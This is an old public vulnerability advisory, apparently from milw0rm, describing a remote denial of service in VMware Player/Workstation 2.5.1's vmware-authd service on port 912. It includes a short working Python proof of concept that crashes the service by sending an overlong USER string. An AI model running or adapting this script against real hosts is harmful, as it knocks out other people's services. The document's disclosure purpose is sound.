@@ -1,0 +1,78 @@
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+Vmware <= 2.5.1 build-126130 Remote Denial of Service
+
+Application: Vmware
+
+Web Site: http://www.vmware.com/
+
+Platform: Windows *
+
+Bug: Remote Denial of Service
+
+Tested agains: Vmware player 2.5.1 build-126130, workstation 2.5.1 build-126130, using Windows XP SP3 fully patched
+
+-------------------------------------------------------
+
+1) Introduction
+
+2) Bug
+
+3) Proof of concept
+
+4) Credits
+
+================
+
+1) Introduction
+
+================
+
+"VMware desktop virtualization technology lets you run multiple operating systems on a single physical computer.
+Easily run Windows applications on your Mac, including high end games and other graphic applications, 
+with VMware Fusion. Run Windows and Linux applications on Windows or Linux PCs with the free VMware Player."
+
+=======
+
+2) Bug
+
+=======
+Vmware-authd listen on 0.0.0.0 port 912 on a windows box by default.
+A denial of service exist in the module vmwarebase.dll of the system process vmware-authd.exe when a long username
+or password is supplied to the service, code execution doesn't look possible at this time.
+A dump file will be created here: C:\Documents and Settings\LocalService\Application Data\VMware\vmware-authd-*.dmp
+Also some old version of this binary (like 6.00.3938.0000) doesn't seems vulnerable to this DoS.
+==================
+
+3)Proof of concept
+
+==================
+Auth-dos.py :
+
+import struct
+import socket
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+buff = 'A' * 350
+target = '192.168.0.102'
+port = 912
+s.connect((target, port))
+data = s.recv(1024)
+s.send('USER '+buff+'\r\n')
+data = s.recv(1024)
+s.send('PASS yo \r\n')
+data = s.recv(1024)
+print " [+] sending dummy payload"
+s.close()
+print " [+] done! "
+
+=====
+
+4)Credits
+
+=====
+
+laurent gaffié
+
+laurent.gaffie{remove_this}[at]gmail[dot]com
+
+# milw0rm.com [2009-01-02]
